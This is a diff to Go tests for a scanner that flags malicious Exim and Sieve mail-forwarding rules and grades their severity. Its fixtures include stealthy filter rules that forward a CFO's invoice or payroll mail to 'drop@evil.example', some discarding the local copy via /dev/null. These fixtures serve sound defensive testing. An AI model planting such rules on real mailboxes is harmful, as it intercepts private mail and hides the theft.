@@ -388,6 +388,78 @@ endif
 	if got[0].kind != "exfil" || got[0].severity != alert.Critical || got[0].onlyIfNew {
 		t.Fatalf("unseen deliver finding = %+v, want non-gated Critical exfil", got[0])
 	}
+	if !got[0].retainsLocalCopy {
+		t.Fatalf("unseen deliver finding = %+v, want retained local delivery", got[0])
+	}
+}
+
+func TestScoreFilterRulesUnseenDeliverWithDevNullLosesLocalCopy(t *testing.T) {
+	localDomains := map[string]bool{"example.com": true}
+	body := `if
+ $header_subject: contains "invoice"
+then
+ unseen deliver "drop@evil.example"
+ save "/dev/null"
+endif
+`
+	got := scoreFilterRules(parseEximFilter(body), filterMailbox{localPart: "cfo", domain: "example.com"}, localDomains, nil)
+	if len(got) != 1 || got[0].kind != "exfil" {
+		t.Fatalf("findings = %+v, want one exfil finding", got)
+	}
+	if got[0].retainsLocalCopy {
+		t.Fatalf("significant /dev/null delivery left an implicit local copy: %+v", got[0])
+	}
+	if !strings.Contains(got[0].reason, "discards the local copy") {
+		t.Fatalf("reason = %q, want destructive-rule evidence", got[0].reason)
+	}
+}
+
+func TestScoreFilterRulesExplicitLocalDeliverySurvivesDevNull(t *testing.T) {
+	localDomains := map[string]bool{"example.com": true}
+	body := `if
+ $header_subject: contains "invoice"
+then
+ deliver "drop@evil.example"
+ deliver "$local_part@$domain"
+ save "/dev/null"
+endif
+`
+	got := scoreFilterRules(parseEximFilter(body), filterMailbox{localPart: "cfo", domain: "example.com"}, localDomains, nil)
+	if len(got) != 1 || got[0].kind != "exfil" {
+		t.Fatalf("findings = %+v, want one exfil finding", got)
+	}
+	if !got[0].retainsLocalCopy {
+		t.Fatalf("explicit local delivery was canceled by /dev/null in scoring: %+v", got[0])
+	}
+	if !strings.Contains(got[0].reason, "keeping a local copy") {
+		t.Fatalf("reason = %q, want retained-copy evidence", got[0].reason)
+	}
+}
+
+func TestScoreFilterRulesDestructiveDuplicateOutranksCopy(t *testing.T) {
+	localDomains := map[string]bool{"example.com": true}
+	body := `if
+ $header_subject: contains "invoice"
+then
+ unseen deliver "drop@evil.example"
+endif
+if
+ $header_subject: contains "payroll"
+then
+ deliver "drop@evil.example"
+ save "/dev/null"
+endif
+`
+	got := scoreFilterRules(parseEximFilter(body), filterMailbox{localPart: "cfo", domain: "example.com"}, localDomains, nil)
+	if len(got) != 1 {
+		t.Fatalf("len(findings) = %d, want one merged destination: %+v", len(got), got)
+	}
+	if got[0].retainsLocalCopy {
+		t.Fatalf("destructive rule was hidden by earlier copy rule: %+v", got[0])
+	}
+	if !strings.Contains(got[0].reason, "discards the local copy") {
+		t.Fatalf("reason = %q, want destructive-rule evidence", got[0].reason)
+	}
 }
 
 func TestScoreFilterRulesSuppressedByKnownForwarder(t *testing.T) {
@@ -439,8 +511,8 @@ func TestMailboxFromFilterPath(t *testing.T) {
 }
 
 // A forward that keeps a local copy is exactly what a webmail "forward and keep
-// a copy" rule produces, so on its own it is not evidence of interception. Both
-// such rules on a production host were the owner's own forwards.
+// a copy" rule produces, so on its own its shape cannot distinguish an owner's
+// forward from an attacker's interception rule.
 func TestLoneCopyForwardNeedsCorroborationBeforeCritical(t *testing.T) {
 	collected := []mailFilterPending{{
 		finding: alert.Finding{
@@ -454,7 +526,7 @@ func TestLoneCopyForwardNeedsCorroborationBeforeCritical(t *testing.T) {
 		retainsLocalCopy: true,
 	}}
 
-	downgradeUncorroboratedCopyExfil(collected)
+	applyMailFilterCorroboration(collected)
 
 	if collected[0].finding.Severity != alert.Warning {
 		t.Fatalf("severity = %v, want Warning for an uncorroborated copy forward", collected[0].finding.Severity)
@@ -472,12 +544,14 @@ func TestCopyForwardStaysCriticalWithSecondMechanism(t *testing.T) {
 			finding:          alert.Finding{Severity: alert.Critical, Check: "email_filter_exfil", FilePath: "/home/u/mail/example.com/office/sieve/roundcube.sieve"},
 			dest:             "drop@evil.example",
 			mailbox:          "office@example.com",
+			mechanism:        mailFilterMechanismSieve,
 			retainsLocalCopy: true,
 		},
 		{
 			finding:          alert.Finding{Severity: alert.Critical, Check: "email_filter_exfil", FilePath: "/home/u/etc/example.com/office/filter"},
 			dest:             "drop@evil.example",
 			mailbox:          "office@example.com",
+			mechanism:        mailFilterMechanismExim,
 			retainsLocalCopy: true,
 		},
 	}
@@ -487,6 +561,33 @@ func TestCopyForwardStaysCriticalWithSecondMechanism(t *testing.T) {
 	for _, p := range collected {
 		if p.finding.Severity != alert.Critical {
 			t.Fatalf("%s severity = %v, want Critical when a second mechanism corroborates", p.finding.FilePath, p.finding.Severity)
+		}
+	}
+}
+
+func TestTwoSieveFilesDoNotCorroborateCopyExfil(t *testing.T) {
+	collected := []mailFilterPending{
+		{
+			finding:          alert.Finding{Severity: alert.Critical, Check: "email_filter_exfil", FilePath: "/home/u/mail/example.com/office/sieve/roundcube.sieve"},
+			dest:             "owner@partner.example",
+			mailbox:          "office@example.com",
+			mechanism:        mailFilterMechanismSieve,
+			retainsLocalCopy: true,
+		},
+		{
+			finding:          alert.Finding{Severity: alert.Critical, Check: "email_filter_exfil", FilePath: "/home/u/mail/example.com/office/.dovecot.sieve"},
+			dest:             "owner@partner.example",
+			mailbox:          "office@example.com",
+			mechanism:        mailFilterMechanismSieve,
+			retainsLocalCopy: true,
+		},
+	}
+
+	downgradeUncorroboratedCopyExfil(collected)
+
+	for _, p := range collected {
+		if p.finding.Severity != alert.Warning {
+			t.Fatalf("%s severity = %v, want Warning for duplicate files from one Sieve mechanism", p.finding.FilePath, p.finding.Severity)
 		}
 	}
 }
@@ -525,12 +626,39 @@ func TestCrossAccountEscalationOutranksCopyDowngrade(t *testing.T) {
 		},
 	}
 
-	downgradeUncorroboratedCopyExfil(collected)
-	annotateCrossAccount(collected)
+	applyMailFilterCorroboration(collected)
 
 	for _, p := range collected {
 		if p.finding.Severity != alert.Critical {
 			t.Fatalf("%s severity = %v, want Critical for a cross-account campaign", p.mailbox, p.finding.Severity)
+		}
+		if strings.Contains(p.finding.Details, "nothing else corroborates") {
+			t.Fatalf("%s retained the uncorroborated Warning annotation: %q", p.mailbox, p.finding.Details)
+		}
+	}
+}
+
+func TestCrossAccountEscalationNormalizesDestinationDomainCase(t *testing.T) {
+	collected := []mailFilterPending{
+		{
+			finding:          alert.Finding{Severity: alert.Critical, Check: "email_filter_exfil", FilePath: "/home/a/mail/example.com/one/sieve/roundcube.sieve"},
+			dest:             "shared@EVIL.example",
+			mailbox:          "one@example.com",
+			retainsLocalCopy: true,
+		},
+		{
+			finding:          alert.Finding{Severity: alert.Critical, Check: "email_filter_exfil", FilePath: "/home/b/mail/example.com/two/sieve/roundcube.sieve"},
+			dest:             "shared@evil.example",
+			mailbox:          "two@example.com",
+			retainsLocalCopy: true,
+		},
+	}
+
+	applyMailFilterCorroboration(collected)
+
+	for _, p := range collected {
+		if p.finding.Severity != alert.Critical {
+			t.Fatalf("%s severity = %v, want Critical for domain-case variants of one destination", p.mailbox, p.finding.Severity)
 		}
 	}
 }
@@ -543,12 +671,14 @@ func TestTwoMechanismsDifferentDestinationsStayCritical(t *testing.T) {
 			finding:          alert.Finding{Severity: alert.Critical, Check: "email_filter_exfil", FilePath: "/home/u/mail/example.com/office/sieve/roundcube.sieve"},
 			dest:             "drop1@evil.example",
 			mailbox:          "office@example.com",
+			mechanism:        mailFilterMechanismSieve,
 			retainsLocalCopy: true,
 		},
 		{
 			finding:          alert.Finding{Severity: alert.Critical, Check: "email_filter_exfil", FilePath: "/home/u/etc/example.com/office/filter"},
 			dest:             "drop2@evil.example",
 			mailbox:          "office@example.com",
+			mechanism:        mailFilterMechanismExim,
 			retainsLocalCopy: true,
 		},
 	}
@@ -579,18 +709,49 @@ func TestPlainForwarderDoesNotCorroborateCopyExfil(t *testing.T) {
 		},
 	}
 
-	downgradeUncorroboratedCopyExfil(collected)
+	applyMailFilterCorroboration(collected)
 
 	if collected[0].finding.Severity != alert.Warning {
 		t.Fatalf("severity = %v, want Warning: a plain forwarder is not corroboration", collected[0].finding.Severity)
 	}
 }
 
+func TestPlainForwarderDoesNotCreateCrossAccountCampaign(t *testing.T) {
+	collected := []mailFilterPending{
+		{
+			finding:          alert.Finding{Severity: alert.Critical, Check: "email_filter_exfil", FilePath: "/home/a/mail/example.com/office/sieve/roundcube.sieve"},
+			dest:             "shared@partner.example",
+			mailbox:          "office@example.com",
+			mechanism:        mailFilterMechanismSieve,
+			retainsLocalCopy: true,
+		},
+		{
+			finding: alert.Finding{Severity: alert.High, Check: "email_filter_forwarder", FilePath: "/home/b/etc/example.net/sales/filter"},
+			dest:    "shared@partner.example",
+			mailbox: "sales@example.net",
+		},
+	}
+
+	applyMailFilterCorroboration(collected)
+
+	if collected[0].finding.Severity != alert.Warning {
+		t.Fatalf("copy-forward severity = %v, want Warning without a second exfil mechanism", collected[0].finding.Severity)
+	}
+	if collected[1].finding.Severity != alert.High {
+		t.Fatalf("plain-forwarder severity = %v, want High", collected[1].finding.Severity)
+	}
+	for _, p := range collected {
+		if strings.Contains(strings.ToLower(p.finding.Details), "cross-account") {
+			t.Fatalf("ordinary forwarder created campaign evidence: %+v", p.finding)
+		}
+	}
+}
+
 func TestAnnotateCrossAccountThreeMailboxes(t *testing.T) {
 	collected := []mailFilterPending{
-		{finding: alert.Finding{Details: "first"}, dest: "shared@gmail.com", mailbox: "a@example.com"},
-		{finding: alert.Finding{Details: "second"}, dest: "shared@gmail.com", mailbox: "b@example.com"},
-		{finding: alert.Finding{Details: "third"}, dest: "shared@gmail.com", mailbox: "c@example.com"},
+		{finding: alert.Finding{Check: "email_filter_exfil", Details: "first"}, dest: "shared@gmail.com", mailbox: "a@example.com"},
+		{finding: alert.Finding{Check: "email_filter_exfil", Details: "second"}, dest: "shared@gmail.com", mailbox: "b@example.com"},
+		{finding: alert.Finding{Check: "email_filter_exfil", Details: "third"}, dest: "shared@gmail.com", mailbox: "c@example.com"},
 	}
 
 	annotateCrossAccount(collected)
@@ -614,7 +775,8 @@ func TestAnnotateCrossAccountThreeMailboxes(t *testing.T) {
 }
 
 // Integration: CheckMailFilters scans per-mailbox filters under /home and
-// flags the stealth filter as a non-gated critical exfil even on first scan.
+// reports a lone copy-forward on the first scan without treating its shape as
+// confirmed interception.
 func TestCheckMailFiltersFlagsStealthOnFirstScan(t *testing.T) {
 	withTestStore(t)
 	now := time.Date(2026, 6, 4, 12, 0, 0, 0, time.UTC)
@@ -651,8 +813,49 @@ func TestCheckMailFiltersFlagsStealthOnFirstScan(t *testing.T) {
 	if f.Check != "email_filter_exfil" || f.Severity != alert.Warning {
 		t.Fatalf("finding = %+v, want email_filter_exfil/Warning", f)
 	}
+	if strings.Contains(strings.ToLower(f.Message), "stealth interception") {
+		t.Fatalf("uncorroborated finding claims attacker intent in its message: %q", f.Message)
+	}
 	if f.Domain != "example.com" || f.Mailbox != "aura@example.com" {
 		t.Errorf("tenant fields = domain %q mailbox %q, want example.com / aura@example.com", f.Domain, f.Mailbox)
+	}
+}
+
+func TestCheckMailFiltersDowngradesPartialCopyFindingOnCancellation(t *testing.T) {
+	withTestStore(t)
+	ctx, cancel := context.WithCancel(context.Background())
+	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
+	firstPath := "/home/first/etc/example.com/office/filter"
+	secondPath := "/home/second/etc/example.com/sales/filter"
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == filepath.Join("/home", "*", "etc", "*", "*", "filter") {
+				return []string{firstPath, secondPath}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{firstPath: now, secondPath: now.Add(-time.Minute)}),
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case firstPath:
+				cancel()
+				return []byte(filterAuraStealth), nil
+			case secondPath:
+				t.Fatal("scan continued to the next filter after cancellation")
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	findings := CheckMailFilters(ctx, &config.Config{}, nil)
+	if len(findings) != 1 {
+		t.Fatalf("len(findings) = %d, want one completed partial finding: %+v", len(findings), findings)
+	}
+	if findings[0].Severity != alert.Warning {
+		t.Fatalf("severity = %v, want Warning after finalizing the partial batch", findings[0].Severity)
 	}
 }
 
@@ -664,6 +867,7 @@ func TestCheckMailFiltersCriticalWhenTwoMechanismsAgree(t *testing.T) {
 	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
 	filterPath := "/home/lifecontro/etc/lifecont.ro/aura/filter"
 	sievePath := "/home/lifecontro/mail/lifecont.ro/aura/sieve/roundcube.sieve"
+	activePath := "/home/lifecontro/mail/lifecont.ro/aura/.dovecot.sieve"
 
 	withMockOS(t, &mockOS{
 		glob: func(pattern string) ([]string, error) {
@@ -672,10 +876,24 @@ func TestCheckMailFiltersCriticalWhenTwoMechanismsAgree(t *testing.T) {
 				return []string{filterPath}, nil
 			case filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve"):
 				return []string{sievePath}, nil
+			case filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve"):
+				return []string{activePath}, nil
 			}
 			return nil, nil
 		},
-		stat: mtimesByPath(map[string]time.Time{filterPath: now, sievePath: now}),
+		stat: mtimesByPath(map[string]time.Time{filterPath: now, sievePath: now, activePath: now}),
+		lstat: func(name string) (os.FileInfo, error) {
+			if name == activePath {
+				return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
+			}
+			return &fakeFileInfoMtime{name: filepath.Base(name), mode: 0o644, mtime: now}, nil
+		},
+		readlink: func(name string) (string, error) {
+			if name == activePath {
+				return filepath.Join("sieve", "roundcube.sieve"), nil
+			}
+			return "", os.ErrNotExist
+		},
 		readFile: func(name string) ([]byte, error) {
 			switch name {
 			case "/etc/localdomains":
@@ -740,6 +958,9 @@ endif
 		t.Fatalf("len(findings) = %d, want 2: %+v", len(findings), findings)
 	}
 	for _, f := range findings {
+		if f.Severity != alert.Critical {
+			t.Errorf("cross-account finding severity = %v, want Critical: %+v", f.Severity, f)
+		}
 		if !strings.Contains(strings.ToLower(f.Details), "cross-account") {
 			t.Errorf("finding missing cross-account annotation: %+v", f)
 		}
